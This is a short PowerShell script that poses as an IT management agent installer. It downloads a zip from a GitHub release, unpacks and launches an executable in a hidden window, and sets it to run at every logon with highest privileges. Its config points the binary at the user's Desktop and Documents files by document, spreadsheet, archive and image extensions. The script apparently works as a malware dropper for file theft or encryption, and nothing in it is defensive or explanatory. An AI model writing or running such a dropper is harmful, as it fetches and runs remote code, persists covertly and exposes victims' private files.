$dir = "$env:LOCALAPPDATA\itmgn"
$exe = "$dir\itagnt.exe"
$zip = "$dir\itagnt.zip"
$cfg = "$dir\agent.json"

[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

New-Item -ItemType Directory -Force -Path $dir | Out-Null
Invoke-WebRequest -Uri "https://github.com/protonme1241/rmm/releases/download/v1.0/itagnt.zip" -OutFile $zip -UseBasicParsing
Expand-Archive -Path $zip -DestinationPath $dir -Force
Remove-Item $zip -Force

if (Test-Path $cfg) {
    try {
        $existing = Get-Content $cfg -Raw | ConvertFrom-Json
        $agentId = $existing.AgentId
    } catch { $agentId = $null }
}
if (-not $agentId) { $agentId = [guid]::NewGuid().ToString() }

$configObj = @{
    AgentId = $agentId
    TargetFolders = @(
        "C:\Users\$env:USERNAME\Desktop",
        "C:\Users\$env:USERNAME\Documents"
    )
    TargetExtensions = @(
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".pdf", ".txt", ".csv", ".zip", ".rar", ".jpg", ".jpeg", ".png"
    )
}

$json = $configObj | ConvertTo-Json -Depth 3
$enc = New-Object System.Text.UTF8Encoding $false
[System.IO.File]::WriteAllText($cfg, $json, $enc)

cmd /c "schtasks /delete /tn itmgn /f" > $null 2>&1
cmd /c "schtasks /create /tn itmgn /tr `"$exe`" /sc ONLOGON /rl HIGHEST /f" > $null 2>&1

Stop-Process -Name itagnt -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
Start-Process -FilePath $exe -WindowStyle Hidden
Write-Host "Done. Agent ID: $agentId"
